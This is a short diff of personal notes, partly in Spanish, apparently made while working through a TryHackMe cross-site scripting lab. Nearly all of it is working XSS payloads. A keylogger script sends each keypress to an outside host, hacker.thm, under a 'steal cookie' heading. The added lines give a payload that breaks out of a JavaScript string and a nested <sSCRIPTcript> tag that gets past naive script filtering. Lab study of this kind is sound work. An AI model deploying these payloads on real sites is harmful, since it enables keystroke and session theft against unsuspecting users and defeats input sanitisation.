@@ -8,3 +8,9 @@ steal cookie:
 keylogger
 <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
 
+
+quebrar un código JS que recibe el imput
+';alert('THM');//
+
+No HTML inject and script clean:
+<sSCRIPTcript> </sSCRIPTcript>
